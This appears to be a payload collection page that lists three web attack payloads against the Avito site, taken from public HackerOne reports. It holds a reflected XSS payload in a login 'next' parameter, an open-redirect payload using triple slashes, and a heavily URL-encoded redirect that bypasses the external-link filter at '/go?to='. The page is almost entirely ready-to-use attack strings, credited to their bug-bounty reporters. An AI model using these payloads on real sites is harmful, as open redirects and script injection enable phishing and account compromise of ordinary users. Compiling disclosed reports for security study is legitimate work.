# Avito

3 payloads.

### `1307193a`

```
https://target.com/sankt-peterburg?verifyUserLocation=1#login?next=javascript:alert(
```

**Parameter:** `next`
— [reflected XSS target.com](https://hackerone.com/reports/344429) · Avito · [circuit](https://hackerone.com/circuit)

### `161e88b3`

```
https://target.com/rossiya#login?next=///<open-redirect-url
```

**Parameter:** `next`
— [Open Redirect via login target.com | Protection bypass](https://hackerone.com/reports/355558) · Avito · [w2w](https://hackerone.com/w2w)

### `bd86ea1f`

```
https://target.com/go?to=%68%74%74%70%3A%2F%2F%67%6F%6F%67%6C%65%2E%63%6F%6D%2F%61%6D%70%2F%25%36%37%25%36%46%25%36%46%25%36%37%25%36%43%25%36%35%25%32%45%25%36%33%25%36%46%25%36%44%25%32%46%25%37%35%25%37%32%25%36%43%25%33%46%25%37%33%25%36%31%25%33%44%25%37%34%25%32%36%25%37%35%25%37%32%25%36%43%25%33%44%25%34%38%25%35%34%25%35%34%25%35%30%25%32%35%25%33%33%25%34%31%25%32%35%25%33%32%25%34%36%25%32%35%25%33%32%25%34%36%25%36%35%25%37%38%25%36%31%25%36%44%25%37%30%25%36%43%25%36%35%25%32%45%
```

**Parameter:** `to`
— [target.com - Bypass of restrictions on external links.](https://hackerone.com/reports/956449) · Avito · [hen51](https://hackerone.com/hen51)
